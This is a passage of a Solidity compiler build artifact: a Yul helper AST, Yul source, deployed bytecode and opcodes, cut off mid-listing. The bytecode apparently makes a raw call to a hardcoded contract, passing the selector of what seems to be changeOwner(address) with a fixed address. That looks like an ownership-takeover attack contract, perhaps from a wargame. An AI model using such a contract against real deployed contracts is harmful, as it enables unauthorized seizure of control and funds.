																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1918:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1918:17:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "tail",
																				"nodeType": "YulIdentifier",
																				"src": "1941:4:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1947:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "1937:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1937:20:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1911:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1911:47:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1911:47:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1967:84:1",
															"value": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "2037:6:1"
																	},
																	{
																		"name": "tail",
																		"nodeType": "YulIdentifier",
																		"src": "2046:4:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1975:61:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1975:76:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1967:4:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_t_bytes_memory_ptr__to_t_bytes_memory_ptr__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1837:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1849:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1860:4:1",
														"type": ""
													}
												],
												"src": "1749:309:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2122:40:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2133:22:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "2149:5:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "2143:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2143:12:1"
															},
															"variableNames": [
																{
																	"name": "length",
																	"nodeType": "YulIdentifier",
																	"src": "2133:6:1"
																}
															]
														}
													]
												},
												"name": "array_length_t_bytes_memory_ptr",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2105:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "2115:6:1",
														"type": ""
													}
												],
												"src": "2064:98:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2263:73:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "2280:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "2285:6:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2273:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2273:19:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2273:19:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "2301:29:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "2320:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2325:4:1",
																		"type": "",
																		"value": "0x20"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "2316:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2316:14:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nodeType": "YulIdentifier",
																	"src": "2301:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "2235:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "2240:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nodeType": "YulTypedName",
														"src": "2251:11:1",
														"type": ""
													}
												],
												"src": "2168:168:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2455:34:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2465:18:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "2480:3:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nodeType": "YulIdentifier",
																	"src": "2465:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "2427:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "2432:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nodeType": "YulTypedName",
														"src": "2443:11:1",
														"type": ""
													}
												],
												"src": "2342:147:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2540:51:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2550:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "2579:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "2561:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2561:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "2550:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2522:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "2532:7:1",
														"type": ""
													}
												],
												"src": "2495:96:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2641:105:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2651:89:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "2666:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2673:66:1",
																		"type": "",
																		"value": "0xffffffff00000000000000000000000000000000000000000000000000000000"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "2662:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2662:78:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "2651:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bytes4",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2623:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "2633:7:1",
														"type": ""
													}
												],
												"src": "2597:149:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2797:81:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2807:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "2822:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2829:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "2818:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2818:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "2807:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2779:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "2789:7:1",
														"type": ""
													}
												],
												"src": "2752:126:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2933:258:1",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "2943:10:1",
															"value": {
																"kind": "number",
																"nodeType": "YulLiteral",
																"src": "2952:1:1",
																"type": "",
																"value": "0"
															},
															"variables": [
																{
																	"name": "i",
																	"nodeType": "YulTypedName",
																	"src": "2947:1:1",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "3012:63:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "dst",
																							"nodeType": "YulIdentifier",
																							"src": "3037:3:1"
																						},
																						{
																							"name": "i",
																							"nodeType": "YulIdentifier",
																							"src": "3042:1:1"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "3033:3:1"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "3033:11:1"
																				},
																				{
																					"arguments": [
																						{
																							"arguments": [
																								{
																									"name": "src",
																									"nodeType": "YulIdentifier",
																									"src": "3056:3:1"
																								},
																								{
																									"name": "i",
																									"nodeType": "YulIdentifier",
																									"src": "3061:1:1"
																								}
																							],
																							"functionName": {
																								"name": "add",
																								"nodeType": "YulIdentifier",
																								"src": "3052:3:1"
																							},
																							"nodeType": "YulFunctionCall",
																							"src": "3052:11:1"
																						}
																					],
																					"functionName": {
																						"name": "mload",
																						"nodeType": "YulIdentifier",
																						"src": "3046:5:1"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "3046:18:1"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "3026:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "3026:39:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "3026:39:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "i",
																		"nodeType": "YulIdentifier",
																		"src": "2973:1:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "2976:6:1"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "2970:2:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2970:13:1"
															},
															"nodeType": "YulForLoop",
															"post": {
																"nodeType": "YulBlock",
																"src": "2984:19:1",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "2986:15:1",
																		"value": {
																			"arguments": [
																				{
																					"name": "i",
																					"nodeType": "YulIdentifier",
																					"src": "2995:1:1"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2998:2:1",
																					"type": "",
																					"value": "32"
																				}
																			],
																			"functionName": {
																				"name": "add",
																				"nodeType": "YulIdentifier",
																				"src": "2991:3:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2991:10:1"
																		},
																		"variableNames": [
																			{
																				"name": "i",
																				"nodeType": "YulIdentifier",
																				"src": "2986:1:1"
																			}
																		]
																	}
																]
															},
															"pre": {
																"nodeType": "YulBlock",
																"src": "2966:3:1",
																"statements": []
															},
															"src": "2962:113:1"
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "3109:76:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "dst",
																							"nodeType": "YulIdentifier",
																							"src": "3159:3:1"
																						},
																						{
																							"name": "length",
																							"nodeType": "YulIdentifier",
																							"src": "3164:6:1"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "3155:3:1"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "3155:16:1"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "3173:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "3148:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "3148:27:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "3148:27:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "i",
																		"nodeType": "YulIdentifier",
																		"src": "3090:1:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "3093:6:1"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nodeType": "YulIdentifier",
																	"src": "3087:2:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3087:13:1"
															},
															"nodeType": "YulIf",
															"src": "3084:101:1"
														}
													]
												},
												"name": "copy_memory_to_memory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "src",
														"nodeType": "YulTypedName",
														"src": "2915:3:1",
														"type": ""
													},
													{
														"name": "dst",
														"nodeType": "YulTypedName",
														"src": "2920:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "2925:6:1",
														"type": ""
													}
												],
												"src": "2884:307:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3244:53:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "3254:37:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "3285:5:1"
																	}
																],
																"functionName": {
																	"name": "leftAlign_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "3265:19:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3265:26:1"
															},
															"variableNames": [
																{
																	"name": "aligned",
																	"nodeType": "YulIdentifier",
																	"src": "3254:7:1"
																}
															]
														}
													]
												},
												"name": "leftAlign_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "3226:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "aligned",
														"nodeType": "YulTypedName",
														"src": "3236:7:1",
														"type": ""
													}
												],
												"src": "3197:100:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3349:32:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "3359:16:1",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "3370:5:1"
															},
															"variableNames": [
																{
																	"name": "aligned",
																	"nodeType": "YulIdentifier",
																	"src": "3359:7:1"
																}
															]
														}
													]
												},
												"name": "leftAlign_t_bytes4",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "3331:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "aligned",
														"nodeType": "YulTypedName",
														"src": "3341:7:1",
														"type": ""
													}
												],
												"src": "3303:78:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3434:47:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "3444:31:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "3469:5:1"
																	}
																],
																"functionName": {
																	"name": "shift_left_96",
																	"nodeType": "YulIdentifier",
																	"src": "3455:13:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3455:20:1"
															},
															"variableNames": [
																{
																	"name": "aligned",
																	"nodeType": "YulIdentifier",
																	"src": "3444:7:1"
																}
															]
														}
													]
												},
												"name": "leftAlign_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "3416:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "aligned",
														"nodeType": "YulTypedName",
														"src": "3426:7:1",
														"type": ""
													}
												],
												"src": "3387:94:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3535:54:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "3545:38:1",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "3563:5:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "3570:2:1",
																				"type": "",
																				"value": "31"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "3559:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "3559:14:1"
																	},
																	{
																		"arguments": [
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "3579:2:1",
																				"type": "",
																				"value": "31"
																			}
																		],
																		"functionName": {
																			"name": "not",
																			"nodeType": "YulIdentifier",
																			"src": "3575:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "3575:7:1"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "3555:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3555:28:1"
															},
															"variableNames": [
																{
																	"name": "result",
																	"nodeType": "YulIdentifier",
																	"src": "3545:6:1"
																}
															]
														}
													]
												},
												"name": "round_up_to_mul_of_32",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "3518:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "result",
														"nodeType": "YulTypedName",
														"src": "3528:6:1",
														"type": ""
													}
												],
												"src": "3487:102:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3637:52:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "3647:35:1",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3672:2:1",
																		"type": "",
																		"value": "96"
																	},
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "3676:5:1"
																	}
																],
																"functionName": {
																	"name": "shl",
																	"nodeType": "YulIdentifier",
																	"src": "3668:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3668:14:1"
															},
															"variableNames": [
																{
																	"name": "newValue",
																	"nodeType": "YulIdentifier",
																	"src": "3647:8:1"
																}
															]
														}
													]
												},
												"name": "shift_left_96",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "3618:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "newValue",
														"nodeType": "YulTypedName",
														"src": "3628:8:1",
														"type": ""
													}
												],
												"src": "3595:94:1"
											}
										]
									},
									"contents": "{\n\n    function abi_encode_t_address_to_t_address_nonPadded_inplace_fromStack(value, pos) {\n        mstore(pos, leftAlign_t_address(cleanup_t_address(value)))\n    }\n\n    function abi_encode_t_bytes4_to_t_bytes4_nonPadded_inplace_fromStack(value, pos) {\n        mstore(pos, leftAlign_t_bytes4(cleanup_t_bytes4(value)))\n    }\n\n    function abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack(value, pos) -> end {\n        let length := array_length_t_bytes_memory_ptr(value)\n        pos := array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack(pos, length)\n        copy_memory_to_memory(add(value, 0x20), pos, length)\n        end := add(pos, round_up_to_mul_of_32(length))\n    }\n\n    function abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(value, pos) -> end {\n        let length := array_length_t_bytes_memory_ptr(value)\n        pos := array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length)\n        copy_memory_to_memory(add(value, 0x20), pos, length)\n        end := add(pos, length)\n    }\n\n    function abi_encode_tuple_packed_t_bytes4_t_address__to_t_bytes4_t_address__nonPadded_inplace_fromStack_reversed(pos , value1, value0) -> end {\n\n        abi_encode_t_bytes4_to_t_bytes4_nonPadded_inplace_fromStack(value0,  pos)\n        pos := add(pos, 4)\n\n        abi_encode_t_address_to_t_address_nonPadded_inplace_fromStack(value1,  pos)\n        pos := add(pos, 20)\n\n        end := pos\n    }\n\n    function abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed(pos , value0) -> end {\n\n        pos := abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(value0,  pos)\n\n        end := pos\n    }\n\n    function abi_encode_tuple_t_bytes_memory_ptr__to_t_bytes_memory_ptr__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack(value0,  tail)\n\n    }\n\n    function array_length_t_bytes_memory_ptr(value) -> length {\n\n        length := mload(value)\n\n    }\n\n    function array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length) -> updated_pos {\n        updated_pos := pos\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_bytes4(value) -> cleaned {\n        cleaned := and(value, 0xffffffff00000000000000000000000000000000000000000000000000000000)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function copy_memory_to_memory(src, dst, length) {\n        let i := 0\n        for { } lt(i, length) { i := add(i, 32) }\n        {\n            mstore(add(dst, i), mload(add(src, i)))\n        }\n        if gt(i, length)\n        {\n            // clear end\n            mstore(add(dst, length), 0)\n        }\n    }\n\n    function leftAlign_t_address(value) -> aligned {\n        aligned := leftAlign_t_uint160(value)\n    }\n\n    function leftAlign_t_bytes4(value) -> aligned {\n        aligned := value\n    }\n\n    function leftAlign_t_uint160(value) -> aligned {\n        aligned := shift_left_96(value)\n    }\n\n    function round_up_to_mul_of_32(value) -> result {\n        result := and(add(value, 31), not(31))\n    }\n\n    function shift_left_96(value) -> newValue {\n        newValue :=\n\n        shl(96, value)\n\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506004361061002b5760003560e01c8063890d690814610030575b600080fd5b61003861004e565b6040516100459190610223565b60405180910390f35b606060007303cbed7039bda6ae4523c6e7bb6579718a584f8390506000808273ffffffffffffffffffffffffffffffffffffffff165a7fa6f9dae13f6f9f7de69814715796059e291f78e951670d244dd3b07111b8bb1873798349e06c67272465123b91bd88c5d19b8c78786040516020016100cb9291906101e0565b6040516020818303038152906040526040516100e7919061020c565b60006040518083038160008787f1925050503d8060008114610125576040519150601f19603f3d011682016040523d82523d6000602084013e61012a565b606091505b5091509150811561014057809350505050610145565b600080fd5b90565b6101596101548261026c565b6102fd565b82525050565b61017061016b8261027e565b61030f565b82525050565b600061018182610245565b61018b8185610250565b935061019b8185602086016102ca565b6101a48161032b565b840191505092915050565b60006101ba82610245565b6101c48185610261565b93506101d48185602086016102ca565b80840191505092915050565b60006101ec828561015f565b6004820191506101fc8284610148565b6014820191508190509392505050565b600061021882846101af565b915081905092915050565b6000602082019050818103600083015261023d8184610176565b905092915050565b600081519050919050565b600082825260208201905092915050565b600081905092915050565b6000610277826102aa565b9050919050565b60007fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60005b838110156102e85780820151818401526020810190506102cd565b838111156102f7576000848401525b50505050565b600061030882610319565b9050919050565b6000819050919050565b60006103248261033c565b9050919050565b6000601f19601f8301169050919050565b60008160601b905091905056fea2646970667358221220b54797e941864c96c82812279e4db62520f1f44501eaa6b1ede40ea9021aef0564736f6c63430008070033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x890D6908 EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x4E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x45 SWAP2 SWAP1 PUSH2 0x223 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x60 PUSH1 0x0 PUSH20 0x3CBED7039BDA6AE4523C6E7BB6579718A584F83 SWAP1 POP PUSH1 0x0 DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GAS PUSH32 0xA6F9DAE13F6F9F7DE69814715796059E291F78E951670D244DD3B07111B8BB18 PUSH20 0x798349E06C67272465123B91BD88C5D19B8C7878 PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0xCB SWAP3 SWAP2 SWAP1 PUSH2 0x1E0 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH2 0xE7 SWAP2 SWAP1 PUSH2 0x20C JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP8 CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x125 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x12A JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 ISZERO PUSH2 0x140 JUMPI DUP1 SWAP4 POP POP POP POP PUSH2 0x145 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP1 JUMP JUMPDEST PUSH2 0x159 PUSH2 0x154 DUP3 PUSH2 0x26C JUMP JUMPDEST PUSH2 0x2FD JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x170 PUSH2 0x16B DUP3 PUSH2 0x27E JUMP JUMPDEST PUSH2 0x30F JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x181 DUP3 PUSH2 0x245 JUMP JUMPDEST PUSH2 0x18B DUP2 DUP6 PUSH2 0x250 JUMP JUMPDEST SWAP4 POP PUSH2 0x19B DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x2CA JUMP JUMPDEST PUSH2 0x1A4 DUP2 PUSH2 0x32B JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1BA DUP3 PUSH2 0x245 JUMP JUMPDEST PUSH2 0x1C4 DUP2 DUP6 PUSH2 0x261 JUMP JUMPDEST SWAP4 POP PUSH2 0x1D4 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x2CA JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1EC DUP3 DUP6 PUSH2 0x15F JUMP JUMPDEST PUSH1 0x4 DUP3 ADD SWAP2 POP PUSH2 0x1FC DUP3 DUP5 PUSH2 0x148 JUMP JUMPDEST PUSH1 0x14 DUP3 ADD SWAP2 POP DUP2 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x218 DUP3 DUP5 PUSH2 0x1AF JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x23D DUP2 DUP5 PUSH2 0x176 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x277 DUP3 PUSH2 0x2AA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH32 